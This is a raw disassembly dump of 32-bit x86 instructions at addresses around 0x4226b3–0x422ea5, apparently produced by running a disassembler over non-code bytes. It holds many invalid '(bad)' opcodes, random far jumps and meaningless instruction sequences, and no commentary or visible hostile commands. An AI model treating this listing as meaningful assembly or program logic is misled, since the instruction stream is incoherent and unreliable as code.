  4226b3:	ret    0x9139
  4226b6:	lea    edx,[ebx+ebx*8]
  4226b9:	add    bl,BYTE PTR [ebx+ebp*1]
  4226bc:	mov    bh,0x99
  4226be:	ror    DWORD PTR [edi-0x563c3e08],cl
  4226c4:	push   esi
  4226c5:	mov    esp,0xc6
  4226ca:	add    BYTE PTR [eax],al
  4226cc:	add    BYTE PTR [eax],al
  4226ce:	fist   WORD PTR [ebx-0x4e]
  4226d1:	dec    edi
  4226d2:	mov    esi,0x67d3ffef
  4226d7:	xchg   ecx,edi
  4226d9:	adc    al,0x45
  4226db:	mov    bl,0x16
  4226dd:	ja     0x422685
  4226df:	iret   
  4226e0:	add    DWORD PTR [eax],eax
  4226e2:	popa   
  4226e3:	add    BYTE PTR [eax],al
  4226e5:	add    ah,bh
  4226e7:	pop    es
  4226e8:	scas   eax,DWORD PTR es:[edi]
  4226e9:	into   
  4226ea:	pop    ebx
  4226eb:	test   al,0x38
  4226ed:	(bad)  
  4226ee:	mov    al,BYTE PTR [ecx+0x69426318]
  4226f4:	add    BYTE PTR [esi],0x77
  4226f7:	neg    BYTE PTR [edx-0x1ab34679]
  4226fd:	std    
  4226fe:	dec    edi
  4226ff:	add    eax,DWORD PTR [esi-0x7fd9fabc]
  422705:	adc    al,0x70
  422707:	add    BYTE PTR [esi+0x908c277],ch
  42270d:	push   ebp
  42270e:	lods   al,BYTE PTR ds:[esi]
  42270f:	jge    0x422767
  422711:	adc    al,0xb9
  422713:	or     DWORD PTR [eax-0x3c8c697b],edi
  422719:	push   0x3d06215
  42271e:	dec    esi
  42271f:	or     ecx,DWORD PTR [edx+0x14]
  422722:	xor    BYTE PTR [ebp+ecx*2-0x68],al
  422726:	shr    DWORD PTR [eax],1
  422728:	jmp    0x4032cacd
  42272d:	or     eax,0xda19c690
  422732:	mov    WORD PTR [eax],gs
  422734:	mov    ch,0xef
  422736:	add    eax,0x6a898c03
  42273b:	sub    eax,0x93d9c072
  422740:	(bad)  
  422741:	not    DWORD PTR [ebx-0x514f6609]
  422747:	add    BYTE PTR [eax],al
  422749:	add    BYTE PTR [eax],al
  42274b:	add    BYTE PTR [eax],al
  42274d:	add    BYTE PTR [edi-0x24252cf4],al
  422753:	fisttp WORD PTR [edi+0x640ccb5d]
  422759:	push   ss
  42275a:	repz dec eax
  42275c:	cli    
  42275d:	add    BYTE PTR [edi],0xd0
  422760:	add    DWORD PTR [eax],eax
  422762:	popa   
  422763:	add    BYTE PTR [eax],al
  422765:	add    BYTE PTR [ecx-0x58],ch
  422768:	inc    ebp
  422769:	gs inc ebp
  42276b:	sar    BYTE PTR [edx+ebp*2+0x7b3f846b],1
  422772:	adc    al,BYTE PTR [di+0x5b]
  422776:	mov    eax,0xf5b28624
  42277b:	aam    0x6d
  42277d:	push   0x1d9cd42d
  422782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422783:	rcr    eax,cl
  422785:	pushf  
  422786:	test   DWORD PTR [ecx+0x37ec6c9],ecx
  42278c:	stos   DWORD PTR es:[edi],eax
  42278d:	retf   0x9840
  422790:	cmp    ebp,DWORD PTR [ebp+0x6c6ef186]
  422796:	mov    ebx,0x20414b78
  42279b:	shl    bl,cl
  42279d:	clc    
  42279e:	mov    dh,BYTE PTR [eax+0x56388957]
  4227a4:	sub    al,0xbc
  4227a6:	call   0xdba449e
  4227ab:	mov    ds:0xf6c78506,eax
  4227b0:	(bad)  
  4227b1:	mov    DWORD PTR [eiz*4+0x5b61c3f5],ebx
  4227b8:	and    al,0x86
  4227ba:	jle    0x422753
  4227bc:	jae    0x4227a9
  4227be:	push   ebx
  4227bf:	icebp  
  4227c0:	popf   
  4227c1:	or     al,BYTE PTR [ebp+ebp*4+0xc6074b]
  4227c8:	add    BYTE PTR [eax],al
  4227ca:	add    BYTE PTR [eax],al
  4227cc:	add    BYTE PTR [eax],al
  4227ce:	lahf   
  4227cf:	arpl   WORD PTR [ebp+0x72],cx
  4227d2:	std    
  4227d3:	jle    0x422794
  4227d5:	out    dx,eax
  4227d6:	sbb    edi,esp
  4227d8:	mov    BYTE PTR [ebp+ecx*2+0x680d430b],dh
  4227df:	rol    BYTE PTR [ecx],1
  4227e1:	add    BYTE PTR [ecx+0x0],ah
  4227e4:	add    BYTE PTR [eax],al
  4227e6:	mov    bh,0x54
  4227e8:	pushf  
  4227e9:	loopne 0x422797
  4227eb:	adc    eax,0xf6a6f1af
  4227f0:	je     0x4227b1
  4227f2:	ret    0xba9f
  4227f5:	xchg   BYTE PTR [edx+edi*4],bl
  4227f8:	mov    ch,0xa2
  4227fa:	lds    eax,FWORD PTR [eax-0x34c0a2e7]
  422800:	adc    al,0x66
  422802:	scas   eax,DWORD PTR es:[edi]
  422803:	adc    al,0xdd
  422805:	cs call 0x53ab6d07
  42280b:	test   BYTE PTR [edi-0x32f89da9],al
  422811:	jno    0x4227b8
  422813:	or     edi,DWORD PTR cs:[ebp-0x30d8a541]
  42281a:	es int3 
  42281c:	xchg   edx,eax
  42281d:	ret    0xd849
  422820:	cdq    
  422821:	les    edi,FWORD PTR [ebx]
  422823:	ror    ch,1
  422825:	lods   al,BYTE PTR ds:[esi]
  422826:	sub    ebp,DWORD PTR [esi-0x2f]
  422829:	shl    BYTE PTR [edx],1
  42282b:	fist   DWORD PTR [eax]
  42282d:	jl     0x42285a
  42282f:	mov    eax,ds:0xa5980869
  422834:	sahf   
  422835:	jne    0x422844
  422837:	sub    edx,0x6ce7ddc1
  42283d:	ss test al,0x7
  422840:	icebp  
  422841:	sbb    esp,ecx
  422843:	inc    edx
  422844:	leave  
  422845:	push   es
  422846:	mov    cl,0x0
  422848:	add    BYTE PTR [eax],al
  42284a:	add    BYTE PTR [eax],al
  42284c:	add    BYTE PTR [eax],al
  42284e:	jo     0x422873
  422850:	and    eax,0x7c6f7769
  422855:	cmp    esp,DWORD PTR [eax+0x52bcee1c]
  42285b:	leave  
  42285c:	push   es
  42285d:	test   eax,0x1d0c9
  422862:	popa   
  422863:	add    BYTE PTR [eax],al
  422865:	add    dl,bh
  422867:	fwait
  422868:	outs   dx,DWORD PTR ds:[esi]
  422869:	pop    esp
  42286a:	push   0xfffffff5
  42286c:	mov    esi,0x29136a7d
  422871:	mov    ds:0xfa9cbc6c,al
  422876:	les    eax,FWORD PTR [esi]
  422878:	shl    DWORD PTR [ecx],cl
  42287a:	das    
  42287b:	inc    ebx
  42287c:	mov    BYTE PTR [edx-0x59],bh
  42287f:	hlt    
  422880:	cmp    BYTE PTR ds:0xa99f8587,0x3
  422887:	enter  0x7526,0x92
  42288b:	outs   dx,DWORD PTR ds:[esi]
  42288c:	fild   DWORD PTR [esp+ecx*2-0x5daa1c91]
  422893:	push   ebx
  422894:	sub    al,dh
  422896:	jne    0x42282e
  422898:	mov    ch,0xa9
  42289a:	push   cs
  42289b:	xchg   ecx,eax
  42289c:	jno    0x4228c9
  42289e:	stos   DWORD PTR es:[edi],eax
  42289f:	fidiv  WORD PTR [ecx]
  4228a1:	jl     0x422850
  4228a3:	xchg   DWORD PTR [eax],ecx
  4228a5:	xor    ecx,eax
  4228a7:	sub    al,BYTE PTR [ebp+0x73b60314]
  4228ad:	mov    ch,0xb3
  4228af:	leave  
  4228b0:	and    BYTE PTR [eax],cl
  4228b2:	(bad)  
  4228b4:	inc    ebp
  4228b5:	lock push ebx
  4228b7:	adc    al,0x7c
  4228b9:	and    eax,0xce0d157b
  4228be:	mov    ecx,0xe2f09648
  4228c3:	or     bl,ah
  4228c5:	fs push ebp
  4228c7:	add    BYTE PTR [eax],al
  4228c9:	add    BYTE PTR [eax],al
  4228cb:	add    BYTE PTR [eax],al
  4228cd:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  4228d4:	popf   
  4228d5:	aam    0x57
  4228d7:	(bad)
  4228db:	sub    eax,0xd12a9a88
  4228e0:	add    DWORD PTR [eax],eax
  4228e2:	popa   
  4228e3:	add    BYTE PTR [eax],al
  4228e5:	add    BYTE PTR [ecx+0x6c],ch
  4228e8:	mov    dh,0x70
  4228ea:	mov    ds:0x5a672696,al
  4228ef:	jb     0x4228b7
  4228f1:	mov    ds:0x94f79799,eax
  4228f6:	test   ch,dh
  4228f8:	stos   DWORD PTR es:[edi],eax
  4228f9:	jb     0x4228bc
  4228fb:	(bad)  
  4228fc:	call   0x9ffdc497
  422901:	adc    al,0x12
  422903:	lods   eax,DWORD PTR ds:[esi]
  422904:	icebp  
  422905:	add    al,0x45
  422907:	inc    ecx
  422908:	mov    esi,0xede82d69
  42290d:	mov    al,ds:0xfd2385af
  422912:	push   ss
  422913:	mov    ch,0x15
  422915:	push   ecx
  422916:	and    DWORD PTR [edx-0x4a],esp
  422919:	jmp    0x3c43b6e
  42291e:	test   ebx,esp
  422920:	outs   dx,DWORD PTR ds:[esi]
  422921:	jmp    0x549af3af
  422926:	jmp    0x9bf7b5e2
  42292b:	inc    edi
  42292c:	xchg   ecx,eax
  42292d:	ret    0x6c0e
  422930:	sbb    ecx,DWORD PTR [eax+0x2b]
  422933:	popf   
  422934:	ja     0x422980
  422936:	bound  esi,QWORD PTR [ecx-0x1b7fdef6]
  42293c:	and    bh,BYTE PTR [ebp-0x6e2c6fc2]
  422942:	rcr    DWORD PTR [eax+0xf7353f],cl
  422948:	add    BYTE PTR [eax],al
  42294a:	add    BYTE PTR [eax],al
  42294c:	add    BYTE PTR [eax],al
  42294e:	hlt    
  42294f:	mov    dl,0x32
  422951:	(bad)  
  422952:	jbe    0x42292a
  422954:	hlt    
  422955:	mov    dl,0xb1
  422957:	and    al,0xfe
  422959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42295a:	iret   
  42295b:	xchg   BYTE PTR [ecx+ecx*2+0x1d18b],dl
  422962:	popa   
  422963:	add    BYTE PTR [eax],al
  422965:	add    BYTE PTR [edx],dh
  422967:	gs call 0xeb7e:0x75ba819b
  42296f:	inc    edx
  422970:	xor    al,0xbb
  422972:	mov    ebp,0xbdd2eb62
  422977:	call   0xb3c623db
  42297c:	or     dl,BYTE PTR [esi+0x5f]
  42297f:	push   ebx
  422980:	jmp    0x3d06:0x33d25183
  422987:	or     BYTE PTR es:[eax+0x28],bl
  42298b:	popf   
  42298c:	test   esp,esi
  42298e:	add    eax,0x2a99dd2
  422993:	fsubr  QWORD PTR [edi-0x691af15a]
  422999:	cmp    BYTE PTR [edx-0x75],dl
  42299c:	or     bl,bl
  42299e:	lea    esp,ds:[esi-0x707eabed]
  4229a5:	add    eax,0x359baf91
  4229aa:	push   eax
  4229ab:	adc    ebx,edi
  4229ad:	mov    esp,?
  4229af:	imul   ecx,DWORD PTR [ecx+0x71],0xa06c081f
  4229b6:	adc    eax,0x1daebe28
  4229bb:	mov    esp,DWORD PTR ds:0x1bb5d7b
  4229c1:	out    0xa9,eax
  4229c3:	hlt    
  4229c4:	mov    ebx,0xf9f3
  4229c9:	add    BYTE PTR [eax],al
  4229cb:	add    BYTE PTR [eax],al
  4229cd:	add    BYTE PTR [edx],dh
  4229cf:	ror    esi,cl
  4229d1:	mov    ds:0xd37ebfef,al
  4229d6:	sub    edi,DWORD PTR [esi]
  4229d8:	out    0x3f,eax
  4229da:	sbb    al,0xd7
  4229dc:	test   eax,0x1d1ecec
  4229e1:	add    BYTE PTR [ecx+0x0],ah
  4229e4:	add    BYTE PTR [eax],al
  4229e6:	push   esi
  4229e7:	rol    BYTE PTR [ebx+edi*2+0x47],0xe
  4229ec:	xor    DWORD PTR [ebx-0x22],esi
  4229ef:	jno    0x422a1c
  4229f1:	retf   0x4ad6
  4229f4:	sbb    esi,DWORD PTR [eax+edx*8]
  4229f7:	sbb    al,0x3a
  4229f9:	(bad)  [ebx-0x79729776]
  4229ff:	push   cs
  422a00:	push   ecx
  422a01:	mov    ch,0xf7
  422a03:	jno    0x422a25
  422a05:	dec    ebx
  422a06:	dec    esp
  422a07:	xor    eax,0x11ca56ce
  422a0c:	xor    dh,cl
  422a0e:	push   edx
  422a0f:	ret    
  422a10:	mov    DWORD PTR [edx-0x76],esp
  422a13:	pop    ebx
  422a14:	xor    eax,0x40ce1f8
  422a19:	inc    ebp
  422a1a:	inc    ebx
  422a1b:	xchg   edi,eax
  422a1c:	and    BYTE PTR [edi+0x49360f47],dl
  422a22:	in     al,0xbf
  422a24:	add    DWORD PTR [ecx+ecx*8],0x35f7642a
  422a2b:	sbb    DWORD PTR [edx-0x2],edi
  422a2e:	call   0x323ddaf8
  422a33:	in     eax,0x29
  422a35:	jmp    0x894f:0x286ebb9d
  422a3c:	lds    edi,FWORD PTR [ebx-0x7b]
  422a3f:	mov    ds:0x68f1e713,al
  422a44:	fyl2xp1 
  422a46:	enter  0x0,0x0
  422a4a:	add    BYTE PTR [eax],al
  422a4c:	add    BYTE PTR [eax],al
  422a4e:	fucomi st,st(5)
  422a50:	outs   dx,BYTE PTR ds:[esi]
  422a51:	and    bh,BYTE PTR [esi-0x5d]
  422a54:	(bad)  
  422a56:	pop    esi
  422a57:	(bad)  
  422a58:	mov    DWORD PTR [ebp-0x1d4392a5],ecx
  422a5e:	dec    ebp
  422a5f:	rol    BYTE PTR [ecx],cl
  422a61:	add    BYTE PTR [ecx+0x0],ah
  422a64:	add    BYTE PTR [eax],al
  422a66:	mov    edi,0x5ce949dc
  422a6b:	das    
  422a6c:	dec    esi
  422a6d:	mov    eax,ds:0x12988e5a
  422a72:	jne    0x422aa0
  422a74:	fstp   QWORD PTR [esi+0x6faadcb7]
  422a7a:	pop    ebp
  422a7b:	cmp    DWORD PTR [ebp-0x53],edx
  422a7e:	call   0xdfec7600
  422a83:	clc    
  422a84:	call   0xdf9cd625
  422a89:	adc    eax,0xa5b52889
  422a8e:	xchg   BYTE PTR ds:0xa7d24682,bh
  422a94:	or     al,0xee
  422a96:	push   es
  422a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a98:	add    DWORD PTR [esi+0x1288950c],ebp
  422a9e:	repz sub eax,0x414751d3
  422aa4:	xchg   ebx,eax
  422aa5:	fcmovnbe st,st(7)
  422aa7:	mov    cl,0x8f
  422aa9:	(bad)  
  422aaa:	jg     0x422b2b
  422aac:	mov    al,BYTE PTR [eax+0x71a08a9d]
  422ab2:	xor    al,0x1
  422ab4:	outs   dx,DWORD PTR ds:[esi]
  422ab5:	mov    dl,0xeb
  422ab7:	pop    eax
  422ab8:	sub    eax,0x6c0b61ef
  422abd:	pop    es
  422abe:	dec    dx
  422ac0:	push   esi
  422ac1:	sub    dl,cl
  422ac3:	xchg   BYTE PTR [ebx+0x1bd2],bh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [eax],al
  422acd:	add    BYTE PTR ds:0x6f976b22,al
  422ad3:	(bad)  
  422ad5:	mov    dl,0x66
  422ad7:	and    BYTE PTR [esi+0x55ee146a],ah
  422add:	aam    0xae
  422adf:	rol    BYTE PTR [ecx],cl
  422ae1:	add    BYTE PTR [ecx+0x0],ah
  422ae4:	add    BYTE PTR [eax],al
  422ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae7:	mov    ecx,0xbf4017d5
  422aec:	jnp    0x422b0b
  422aee:	jl     0x422b3b
  422af0:	int3   
  422af1:	push   es
  422af2:	arpl   dx,ax
  422af4:	scas   eax,DWORD PTR es:[edi]
  422af5:	xchg   edi,eax
  422af6:	mov    edx,0x87b7a433
  422afb:	sub    DWORD PTR [eax],ecx
  422afd:	inc    ebp
  422afe:	stc    
  422aff:	lods   eax,DWORD PTR ds:[esi]
  422b00:	push   esp
  422b01:	adc    ah,dh
  422b03:	out    0xea,al
  422b05:	pop    es
  422b06:	pop    ecx
  422b07:	aam    0x4d
  422b09:	repnz lods eax,DWORD PTR ds:[esi]
  422b0b:	and    DWORD PTR [edi],esi
  422b0d:	mov    esp,0xbbbb4d75
  422b12:	mov    bh,0x76
  422b14:	fld    DWORD PTR [esi]
  422b16:	fisttp DWORD PTR [ebx]
  422b18:	mov    edi,0x7e955368
  422b1d:	xor    cl,BYTE PTR [ebp+esi*2-0x30]
  422b21:	mov    WORD PTR [eax-0x45d8b34a],cs
  422b27:	lods   al,BYTE PTR ds:[esi]
  422b28:	test   DWORD PTR [eax],ebx
  422b2a:	mov    edx,0x7c7503c5
  422b2f:	ret    
  422b30:	clc    
  422b31:	in     al,0x55
  422b33:	dec    esi
  422b34:	xor    ah,0x84
  422b37:	cmp    cl,BYTE PTR [edi-0x33c6e4d5]
  422b3d:	push   edi
  422b3e:	inc    ecx
  422b3f:	add    dh,BYTE PTR [esi+ecx*2+0x7d1543c]
  422b46:	data16 add BYTE PTR [eax],al
  422b49:	add    BYTE PTR [eax],al
  422b4b:	add    BYTE PTR [eax],al
  422b4d:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422b53:	stc    
  422b54:	call   esi
  422b56:	into   
  422b57:	inc    ebp
  422b58:	mov    bh,0x11
  422b5a:	jns    0x422bca
  422b5c:	mov    DWORD PTR [edx+0x1d30f],ebx
  422b62:	popa   
  422b63:	add    BYTE PTR [eax],al
  422b65:	add    BYTE PTR [edx+0x2d],dh
  422b68:	cmp    al,0xed
  422b6a:	jne    0x422b78
  422b6c:	(bad)  
  422b6d:	(bad)  
  422b6e:	push   ss
  422b6f:	sub    esp,esi
  422b71:	push   0xf98d7a5e
  422b76:	(bad)  
  422b77:	xor    eax,0x731186c7
  422b7c:	shl    BYTE PTR [esi+esi*8+0xc],0xe6
  422b81:	rcl    eax,cl
  422b83:	popf   
  422b84:	mov    eax,0x82440351
  422b89:	je     0x422baf
  422b8b:	shl    BYTE PTR [eax+0x351e90c0],0x38
  422b92:	pusha  
  422b93:	push   ebp
  422b94:	xlat   BYTE PTR ds:[ebx]
  422b95:	add    eax,0x20de4207
  422b9a:	mov    ecx,DWORD PTR [edi]
  422b9c:	loopne 0x422bc2
  422b9e:	cwde   
  422b9f:	fisttp DWORD PTR [eax]
  422ba1:	outs   dx,BYTE PTR ds:[esi]
  422ba2:	stos   DWORD PTR es:[edi],eax
  422ba3:	add    al,0x91
  422ba5:	sbb    ch,BYTE PTR [edi-0x22b23322]
  422bab:	ins    DWORD PTR es:[edi],dx
  422bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bad:	add    esp,DWORD PTR [ebp+edi*2-0x46]
  422bb1:	rcr    edi,cl
  422bb3:	test   BYTE PTR [esi],bh
  422bb5:	or     eax,0x2a131ca1
  422bba:	inc    ecx
  422bbb:	cmp    eax,0x5bbb004e
  422bc0:	and    ecx,esi
  422bc2:	dec    ecx
  422bc3:	inc    ecx
  422bc4:	aad    0xbe
  422bc6:	jbe    0x422bc8
  422bc8:	add    BYTE PTR [eax],al
  422bca:	add    BYTE PTR [eax],al
  422bcc:	add    BYTE PTR [eax],al
  422bce:	fisubr WORD PTR [ecx]
  422bd0:	cwde   
  422bd1:	sar    bh,cl
  422bd3:	repz fisubr WORD PTR ds:0x4af35f6
  422bda:	push   0x5b
  422bdc:	data16 in al,dx
  422bde:	jo     0x422bb3
  422be0:	add    DWORD PTR [eax],eax
  422be2:	popa   
  422be3:	add    BYTE PTR [eax],al
  422be5:	add    cl,ah
  422be7:	push   cs
  422be8:	sbb    al,0x86
  422bea:	iret   
  422beb:	loope  0x422bb5
  422bed:	call   0x2d44:0x7a2be98c
  422bf4:	jne    0x422c54
  422bf6:	pop    ebx
  422bf7:	rcl    DWORD PTR [ecx+0x67],cl
  422bfa:	ret    0xfcfc
  422bfd:	or     cl,BYTE PTR [edx+0x2c9db9d5]
  422c03:	(bad)  
  422c05:	in     al,dx
  422c06:	inc    ecx
  422c07:	aaa    
  422c08:	pop    esp
  422c09:	std    
  422c0a:	cmp    ebx,DWORD PTR [ebx]
  422c0c:	fld    TBYTE PTR [ebx+0x15]
  422c0f:	into   
  422c10:	inc    ebp
  422c11:	mov    DWORD PTR [edx+0x4c9b7aa0],edi
  422c17:	mov    eax,0xa09ea31
  422c1c:	sbb    BYTE PTR ds:0x807a72a9,0x58
  422c23:	popw   ss
  422c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c26:	dec    edx
  422c27:	dec    ecx
  422c28:	fimul  WORD PTR [ecx-0x268ffe2e]
  422c2e:	push   0xa30fcc79
  422c33:	call   0x912b:0x243dd118
  422c3a:	xchg   ebx,eax
  422c3b:	jb     0x422c01
  422c3d:	fs std 
  422c3f:	sub    ebx,DWORD PTR [edx+0x23]
  422c42:	std    
  422c43:	pop    edx
  422c44:	mov    cl,0x3
  422c46:	inc    esi
  422c47:	add    BYTE PTR [eax],al
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [eax],al
  422c4d:	add    BYTE PTR [esi+0x3f],cl
  422c50:	int3   
  422c51:	sbb    eax,0x7fdffffd
  422c56:	out    dx,eax
  422c57:	loopne 0x422c6f
  422c59:	lods   al,BYTE PTR ds:[esi]
  422c5a:	iret   
  422c5b:	ret    0x5498
  422c5e:	rcl    ebx,1
  422c60:	add    DWORD PTR [eax],eax
  422c62:	popa   
  422c63:	add    BYTE PTR [eax],al
  422c65:	add    dl,al
  422c67:	or     al,0xeb
  422c69:	jge    0x422c59
  422c6b:	sub    ebp,DWORD PTR [eax]
  422c6d:	pop    edx
  422c6e:	fs out 0x12,al
  422c71:	nop
  422c72:	loope  0x422c4d
  422c74:	mov    ecx,0xacabb58f
  422c79:	dec    ebp
  422c7a:	xor    BYTE PTR [ebp+0x3bb79569],ah
  422c80:	imul   edx,DWORD PTR ds:0x70f6d900,0x40
  422c87:	mov    dl,0x19
  422c89:	cmp    BYTE PTR [edx-0xf],dh
  422c8c:	push   esp
  422c8d:	or     ch,al
  422c8f:	mov    ah,0x5c
  422c91:	in     al,0xc3
  422c93:	inc    DWORD PTR [eax-0x1c]
  422c96:	dec    esi
  422c97:	ds in  al,dx
  422c99:	xor    BYTE PTR ds:0x33c76c76,0xb4
  422ca0:	cwde   
  422ca1:	inc    esp
  422ca2:	cmp    DWORD PTR [ebx+0x54],ebx
  422ca5:	adc    BYTE PTR [edx-0x79],dh
  422ca8:	jg     0x422c6d
  422caa:	and    edi,edi
  422cac:	push   eax
  422cad:	fcmovne st,st(1)
  422caf:	sbb    BYTE PTR [eax+edi*2+0x363fb5b9],bl
  422cb6:	fild   WORD PTR [ecx+ebx*1+0x8092223]
  422cbd:	mov    bh,0x5d
  422cbf:	xchg   ebx,eax
  422cc0:	and    DWORD PTR [ecx+ecx*1+0x1d],ebp
  422cc4:	or     DWORD PTR [ecx+0x80],0x0
  422cce:	push   ds
  422ccf:	test   eax,0x7ff735f6
  422cd4:	fild   QWORD PTR [ebx-0x5f9ed871]
  422cda:	les    edx,FWORD PTR [ebx-0x2bcd3dc9]
  422ce0:	add    DWORD PTR [eax],eax
  422ce2:	popa   
  422ce3:	add    BYTE PTR [eax],al
  422ce5:	add    BYTE PTR [ecx],ah
  422ce7:	jge    0x422c6a
  422ce9:	and    eax,0x22e75372
  422cee:	push   ebp
  422cef:	jno    0x422cac
  422cf1:	push   esi
  422cf2:	ret    0x5602
  422cf5:	mov    ebp,0x289e680e
  422cfa:	pop    ds
  422cfb:	inc    ebx
  422cfc:	retf   0xf63a
  422cff:	inc    edi
  422d00:	mov    bl,0x4a
  422d02:	dec    edx
  422d03:	push   esp
  422d04:	in     eax,0xed
  422d06:	scas   eax,DWORD PTR es:[edi]
  422d07:	popf   
  422d08:	outs   dx,BYTE PTR ds:[esi]
  422d09:	mov    al,0x4
  422d0b:	mov    ecx,0xfe7acd6a
  422d10:	frstor ds:0xfcf17b81
  422d17:	cdq    
  422d18:	mov    edx,gs
  422d1a:	jno    0x422d34
  422d1c:	mov    ebp,0x71fd758
  422d21:	xlat   BYTE PTR ds:[ebx]
  422d22:	scas   al,BYTE PTR es:[edi]
  422d23:	jno    0x422d25
  422d25:	stos   DWORD PTR es:[edi],eax
  422d26:	mov    edx,0xa6ad7cdc
  422d2b:	pop    ss
  422d2c:	rol    DWORD PTR [eax-0x11ba9cf0],cl
  422d32:	enter  0x7a93,0xec
  422d36:	xor    BYTE PTR [edx+0xff0b198],dl
  422d3c:	xchg   ebp,eax
  422d3d:	xchg   eax,esp
  422d3f:	dec    edx
  422d40:	fnstcw WORD PTR [esi]
  422d42:	mov    esp,0xa55909bc
  422d47:	add    BYTE PTR [eax],al
  422d49:	add    BYTE PTR [eax],al
  422d4b:	add    BYTE PTR [eax],al
  422d4d:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  422d53:	lods   eax,DWORD PTR ds:[esi]
  422d54:	fcomi  st,st(7)
  422d56:	sar    BYTE PTR [ebx],cl
  422d58:	(bad)  
  422d59:	add    BYTE PTR [ecx-0x6c70a3ea],bl
  422d5f:	aam    0x1
  422d61:	add    BYTE PTR [ecx+0x0],ah
  422d64:	add    BYTE PTR [eax],al
  422d66:	push   ds
  422d67:	int    0x65
  422d69:	(bad)  
  422d6a:	xchg   ebx,eax
  422d6b:	jmp    0x99fc:0x9fa71ff6
  422d72:	mov    ebp,0x15d8b226
  422d77:	mul    DWORD PTR [ebx]
  422d79:	call   0xf379:0x2365821e
  422d80:	mov    ds:0x5ca8f163,al
  422d85:	inc    edi
  422d86:	sub    edi,ebp
  422d88:	jecxz  0x422d3f
  422d8a:	ret    
  422d8b:	pop    ecx
  422d8c:	std    
  422d8d:	dec    ebx
  422d8f:	retf   0x44b1
  422d92:	pop    edx
  422d93:	stc    
  422d94:	and    al,0x64
  422d96:	xor    DWORD PTR [ebx-0x15],0xf4a4a742
  422d9d:	inc    eax
  422d9e:	sti    
  422d9f:	jb     0x422db6
  422da1:	xchg   edi,eax
  422da2:	dec    esi
  422da3:	test   eax,0xca8f7eb4
  422da8:	in     eax,0x52
  422daa:	push   ss
  422dab:	cmp    dh,ch
  422dad:	scas   eax,DWORD PTR es:[edi]
  422dae:	adc    eax,0x49d42517
  422db3:	sbb    bh,ah
  422db5:	sub    BYTE PTR [esi+0x46],cl
  422db8:	push   es
  422db9:	out    dx,al
  422dba:	clc    
  422dbb:	dec    edi
  422dbc:	lock retf 0x39bf
  422dc0:	dec    eax
  422dc1:	adc    al,0x80
  422dc3:	clc    
  422dc4:	js     0x422e34
  422dc6:	pusha  
  422dc7:	add    BYTE PTR [eax],al
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [eax],al
  422dcd:	add    BYTE PTR [eax],cl
  422dcf:	div    DWORD PTR [edi+0x4a]
  422dd2:	dec    edx
  422dd4:	cmp    eax,0x2e8eedf7
  422dd9:	dec    eax
  422dda:	stc    
  422ddb:	dec    ebx
  422ddc:	fmul   QWORD PTR [edi]
  422dde:	hlt    
  422ddf:	aam    0x1
  422de1:	add    BYTE PTR [ecx+0x0],ah
  422de4:	add    BYTE PTR [eax],al
  422de6:	xor    eax,DWORD PTR [eax]
  422de8:	stc    
  422de9:	and    cl,BYTE PTR [esi]
  422deb:	pop    ebx
  422dec:	icebp  
  422ded:	adc    cl,ch
  422def:	adc    DWORD PTR [ebp+0x52],0xffffff88
  422df3:	test   al,0xf1
  422df5:	aam    0x6b
  422df7:	push   es
  422df8:	jmp    0xe1dca93
  422dfd:	jbe    0x422d9c
  422dff:	mov    gs,WORD PTR [esi-0x3b]
  422e02:	add    ebp,DWORD PTR [ebp-0x75e95ce6]
  422e08:	jl     0x422df2
  422e0a:	nop
  422e0b:	push   0x1e67ac34
  422e10:	out    dx,eax
  422e11:	jno    0x422e54
  422e13:	and    DWORD PTR [bp+si],esi
  422e16:	stos   BYTE PTR es:[edi],al
  422e17:	imul   ebp,DWORD PTR [edx],0x75
  422e1a:	push   0xc8660c27
  422e1f:	sub    DWORD PTR [eax+0x3],edi
  422e22:	shr    DWORD PTR [ecx-0x4af6b530],1
  422e28:	sbb    BYTE PTR [ebx+ebp*8],bh
  422e2b:	shl    BYTE PTR [esi],0x60
  422e2e:	jnp    0x422ead
  422e30:	(bad)  
  422e32:	adc    eax,0x52fa4ec4
  422e37:	add    dl,0x2e
  422e3a:	jb     0x422dd7
  422e3c:	out    0x9d,eax
  422e3e:	daa    
  422e3f:	pusha  
  422e40:	rcr    DWORD PTR [edx],cl
  422e42:	test   al,0x6f
  422e44:	mov    ch,BYTE PTR ds:0x81
  422e4a:	add    BYTE PTR [eax],al
  422e4c:	add    BYTE PTR [eax],al
  422e4e:	arpl   WORD PTR ss:[eax-0x10],bp
  422e52:	jge    0x422e4f
  422e54:	mov    esi,0x8c7853e7
  422e59:	daa    
  422e5a:	xor    al,0x11
  422e5c:	dec    esi
  422e5d:	push   ebx
  422e5e:	push   ebp
  422e5f:	aad    0x1
  422e61:	add    BYTE PTR [ecx+0x0],ah
  422e64:	add    BYTE PTR [eax],al
  422e66:	cmp    al,0x31
  422e68:	repz jmp 0xb05636f0
  422e6e:	add    DWORD PTR [ecx+0x1b],edx
  422e71:	fidivr WORD PTR [edi-0x174a96c3]
  422e77:	jecxz  0x422e7d
  422e79:	paddusw mm6,QWORD PTR [ebx-0x6e]
  422e7d:	fimul  DWORD PTR [ebx]
  422e7f:	xor    BYTE PTR [ebx-0xdb43aa1],ch
  422e85:	xchg   esi,eax
  422e86:	(bad)  
  422e87:	retf   
  422e88:	retf   
  422e89:	dec    edx
  422e8a:	loope  0x422e43
  422e8c:	and    ecx,DWORD PTR [edx]
  422e8e:	add    cl,BYTE PTR [edi]
  422e90:	mov    dl,0x9b
  422e92:	xor    DWORD PTR [esi+0x20],esi
  422e95:	cdq    
  422e96:	pop    esi
  422e97:	pop    ss
  422e98:	jno    0x422f0c
  422e9a:	popa   
  422e9b:	out    0x89,eax
  422e9d:	jmp    0x9a5b:0x495b49cf
  422ea4:	dec    esi
  422ea5:	shr    BYTE PTR [ecx+edx*4-0x2f986c5f],cl
